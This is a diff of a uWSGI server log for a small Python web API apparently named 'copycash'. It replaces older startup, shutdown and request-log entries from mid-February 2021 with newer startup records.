@@ -1,516 +1,4 @@
-*** Starting uWSGI 2.0.18-debian (64bit) on [Mon Feb 15 18:30:26 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 31679
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 2204)
-spawned uWSGI worker 1 (pid: 2205, cores: 1)
-spawned uWSGI worker 2 (pid: 2206, cores: 1)
-spawned uWSGI worker 3 (pid: 2207, cores: 1)
-spawned uWSGI worker 4 (pid: 2208, cores: 1)
-spawned uWSGI worker 5 (pid: 2209, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Mon Feb 15 22:22:02 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 31679
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 511)
-spawned uWSGI worker 1 (pid: 599, cores: 1)
-spawned uWSGI worker 2 (pid: 600, cores: 1)
-spawned uWSGI worker 3 (pid: 601, cores: 1)
-spawned uWSGI worker 4 (pid: 602, cores: 1)
-spawned uWSGI worker 5 (pid: 603, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 0 seconds
-worker 4 buried after 0 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Mon Feb 15 23:08:29 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 31679
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 511)
-spawned uWSGI worker 1 (pid: 599, cores: 1)
-spawned uWSGI worker 2 (pid: 600, cores: 1)
-spawned uWSGI worker 3 (pid: 601, cores: 1)
-spawned uWSGI worker 4 (pid: 602, cores: 1)
-spawned uWSGI worker 5 (pid: 603, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Wed Feb 17 12:49:55 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 31679
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 523)
-spawned uWSGI worker 1 (pid: 654, cores: 1)
-spawned uWSGI worker 2 (pid: 655, cores: 1)
-spawned uWSGI worker 3 (pid: 656, cores: 1)
-spawned uWSGI worker 4 (pid: 657, cores: 1)
-spawned uWSGI worker 5 (pid: 658, cores: 1)
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 0 seconds
-worker 2 buried after 0 seconds
-worker 3 buried after 0 seconds
-worker 4 buried after 0 seconds
-worker 5 buried after 0 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Wed Feb 17 22:08:39 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 31679
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 503)
-spawned uWSGI worker 1 (pid: 596, cores: 1)
-spawned uWSGI worker 2 (pid: 597, cores: 1)
-spawned uWSGI worker 3 (pid: 598, cores: 1)
-spawned uWSGI worker 4 (pid: 599, cores: 1)
-spawned uWSGI worker 5 (pid: 600, cores: 1)
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Thu Feb 18 02:54:13 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 513)
-spawned uWSGI worker 1 (pid: 594, cores: 1)
-spawned uWSGI worker 2 (pid: 595, cores: 1)
-spawned uWSGI worker 3 (pid: 596, cores: 1)
-spawned uWSGI worker 4 (pid: 597, cores: 1)
-spawned uWSGI worker 5 (pid: 598, cores: 1)
-*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb 18 02:57:13 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/.local/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x56008fb857b0
-your server socket listen backlog is limited to 100 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x56008fb857b0 pid: 877 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 877)
-spawned uWSGI worker 1 (pid: 881, cores: 1)
-spawned uWSGI worker 2 (pid: 882, cores: 1)
-spawned uWSGI worker 3 (pid: 883, cores: 1)
-spawned uWSGI worker 4 (pid: 884, cores: 1)
-spawned uWSGI worker 5 (pid: 885, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb 18 03:23:28 2021] ***
-compiled with version: 8.3.0 on 08 February 2021 21:53:20
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /home/tallys_prado/.local/bin/uwsgi
-!!! no internal routing support, rebuild with pcre support !!!
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
-*** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x5578aa9ca7b0
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437424 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5578aa9ca7b0 pid: 4798 (default app)
-*** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 4798)
-spawned uWSGI worker 1 (pid: 4802, cores: 1)
-spawned uWSGI worker 2 (pid: 4803, cores: 1)
-spawned uWSGI worker 3 (pid: 4804, cores: 1)
-spawned uWSGI worker 4 (pid: 4805, cores: 1)
-spawned uWSGI worker 5 (pid: 4806, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-unlink(): No such file or directory [core/uwsgi.c line 1660]
-*** Starting uWSGI 2.0.18-debian (64bit) on [Thu Feb 18 03:31:35 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 494)
-spawned uWSGI worker 1 (pid: 586, cores: 1)
-spawned uWSGI worker 2 (pid: 587, cores: 1)
-spawned uWSGI worker 3 (pid: 588, cores: 1)
-spawned uWSGI worker 4 (pid: 589, cores: 1)
-spawned uWSGI worker 5 (pid: 590, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Thu Feb 18 17:25:16 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 499)
-spawned uWSGI worker 1 (pid: 579, cores: 1)
-spawned uWSGI worker 2 (pid: 580, cores: 1)
-spawned uWSGI worker 3 (pid: 581, cores: 1)
-spawned uWSGI worker 4 (pid: 582, cores: 1)
-spawned uWSGI worker 5 (pid: 583, cores: 1)
-SIGINT/SIGQUIT received...killing workers...
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-Thu Feb 18 17:49:19 2021 - worker 1 (pid: 579) is taking too much time to die...NO MERCY !!!
-worker 1 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.18-debian (64bit) on [Thu Feb 18 20:52:55 2021] ***
-compiled with version: 8.2.0 on 10 February 2019 02:42:46
-os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
-nodename: instance-1
-machine: x86_64
-clock source: unix
-pcre jit disabled
-detected number of CPU cores: 2
-current working directory: /home/tallys_prado/copycash/api
-detected binary path: /usr/bin/uwsgi-core
-your processes number limit is 7740
-your memory page size is 4096 bytes
-detected max file descriptor number: 1024
-lock engine: pthread robust mutexes
-thunder lock: disabled (you can enable it with --thunder-lock)
-uwsgi socket 0 bound to UNIX address copycash.sock fd 3
-your server socket listen backlog is limited to 0 connections
-your mercy for graceful operations on workers is 60 seconds
-mapped 437520 bytes (427 KB) for 5 cores
-*** Operational MODE: preforking ***
-*** no app loaded. going in full dynamic mode ***
-*** uWSGI is running in multiple interpreter mode ***
-!!!!!!!!!!!!!! WARNING !!!!!!!!!!!!!!
-no request plugin is loaded, you will not be able to manage requests.
-you may need to install the package for your language of choice, or simply load it with --plugin.
-!!!!!!!!!!! END OF WARNING !!!!!!!!!!
-spawned uWSGI master process (pid: 513)
-spawned uWSGI worker 1 (pid: 585, cores: 1)
-spawned uWSGI worker 2 (pid: 586, cores: 1)
-spawned uWSGI worker 3 (pid: 587, cores: 1)
-spawned uWSGI worker 4 (pid: 588, cores: 1)
-spawned uWSGI worker 5 (pid: 589, cores: 1)
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
--- unavailable modifier requested: 0 --
-SIGINT/SIGQUIT received...killing workers...
-worker 1 buried after 1 seconds
-worker 2 buried after 1 seconds
-worker 3 buried after 1 seconds
-worker 4 buried after 1 seconds
-worker 5 buried after 1 seconds
-goodbye to uWSGI.
-VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb 18 23:09:22 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 05:47:31 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -528,24 +16,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x556ebef1df80
+Python main interpreter initialized at 0x564626ea9f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556ebef1df80 pid: 3921 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x564626ea9f80 pid: 7717 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 3921)
-spawned uWSGI worker 1 (pid: 3924, cores: 1)
-spawned uWSGI worker 2 (pid: 3925, cores: 1)
-spawned uWSGI worker 3 (pid: 3926, cores: 1)
-spawned uWSGI worker 4 (pid: 3927, cores: 1)
-spawned uWSGI worker 5 (pid: 3928, cores: 1)
-[pid: 3928|app: 0|req: 1/1] 127.0.0.1 () {32 vars in 344 bytes} [Thu Feb 18 23:09:35 2021] GET / => generated 12 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3927|app: 0|req: 1/2] 177.37.194.64 () {42 vars in 780 bytes} [Thu Feb 18 23:09:38 2021] GET / => generated 12 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3928|app: 0|req: 2/3] 127.0.0.1 () {32 vars in 344 bytes} [Thu Feb 18 23:09:51 2021] GET / => generated 12 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3928|app: 0|req: 3/4] 177.37.194.64 () {42 vars in 780 bytes} [Thu Feb 18 23:10:02 2021] GET / => generated 12 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3928|app: 0|req: 4/5] 177.37.194.64 () {42 vars in 780 bytes} [Thu Feb 18 23:10:34 2021] GET / => generated 12 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
+spawned uWSGI master process (pid: 7717)
+spawned uWSGI worker 1 (pid: 7721, cores: 1)
+spawned uWSGI worker 2 (pid: 7722, cores: 1)
+spawned uWSGI worker 3 (pid: 7723, cores: 1)
+spawned uWSGI worker 4 (pid: 7724, cores: 1)
+spawned uWSGI worker 5 (pid: 7725, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -554,7 +37,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb 18 23:10:42 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 05:48:13 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -572,26 +55,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x5604c863cf80
+Python main interpreter initialized at 0x55e9343edf80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5604c863cf80 pid: 3949 (default app)
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55e9343edf80 pid: 7744 (default app)
 *** uWSGI is running in multiple interpreter mode ***
-spawned uWSGI master process (pid: 3949)
-spawned uWSGI worker 1 (pid: 3952, cores: 1)
-spawned uWSGI worker 2 (pid: 3953, cores: 1)
-spawned uWSGI worker 3 (pid: 3954, cores: 1)
-spawned uWSGI worker 4 (pid: 3955, cores: 1)
-spawned uWSGI worker 5 (pid: 3956, cores: 1)
-[pid: 3953|app: 0|req: 1/1] 177.37.194.64 () {42 vars in 780 bytes} [Thu Feb 18 23:10:43 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3956|app: 0|req: 1/2] 177.37.194.64 () {40 vars in 670 bytes} [Thu Feb 18 23:11:25 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3952|app: 0|req: 1/3] 177.37.194.64 () {40 vars in 634 bytes} [Thu Feb 18 23:11:25 2021] GET /favicon.ico => generated 232 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 144 bytes (1 switches on core 0)
-[pid: 3956|app: 0|req: 2/4] 177.37.194.64 () {42 vars in 788 bytes} [Thu Feb 18 23:25:59 2021] GET / => generated 34 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3956|app: 0|req: 3/5] 177.37.194.64 () {42 vars in 787 bytes} [Thu Feb 18 23:26:39 2021] GET / => generated 34 bytes in 0 msecs (HTTP/1.1 200) 3 headers in 136 bytes (1 switches on core 0)
-[pid: 3955|app: 0|req: 1/6] 177.37.194.64 () {42 vars in 791 bytes} [Thu Feb 18 23:27:06 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
-[pid: 3954|app: 0|req: 1/7] 177.37.194.64 () {42 vars in 787 bytes} [Thu Feb 18 23:27:30 2021] GET / => generated 34 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 136 bytes (2 switches on core 0)
+spawned uWSGI master process (pid: 7744)
+spawned uWSGI worker 1 (pid: 7747, cores: 1)
+spawned uWSGI worker 2 (pid: 7748, cores: 1)
+spawned uWSGI worker 3 (pid: 7749, cores: 1)
+spawned uWSGI worker 4 (pid: 7750, cores: 1)
+spawned uWSGI worker 5 (pid: 7751, cores: 1)
 SIGINT/SIGQUIT received...killing workers...
 worker 1 buried after 1 seconds
 worker 2 buried after 1 seconds
@@ -600,7 +76,7 @@ worker 4 buried after 1 seconds
 worker 5 buried after 1 seconds
 goodbye to uWSGI.
 VACUUM: unix socket copycash.sock removed.
-*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Feb 18 23:28:15 2021] ***
+*** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 20 06:22:30 2021] ***
 compiled with version: 8.3.0 on 08 February 2021 21:53:20
 os: Linux-4.19.0-14-cloud-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30)
 nodename: instance-1
@@ -618,22 +94,19 @@ thunder lock: disabled (you can enable it with --thunder-lock)
 uwsgi socket 0 bound to UNIX address copycash.sock fd 3
 Python version: 3.7.3 (default, Jul 25 2020, 13:03:44)  [GCC 8.3.0]
 *** Python threads support is disabled. You can enable it with --enable-threads ***
-Python main interpreter initialized at 0x5608a3adcf80
+Python main interpreter initialized at 0x55c819c58f80
 your server socket listen backlog is limited to 0 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 437424 bytes (427 KB) for 5 cores
 *** Operational MODE: preforking ***
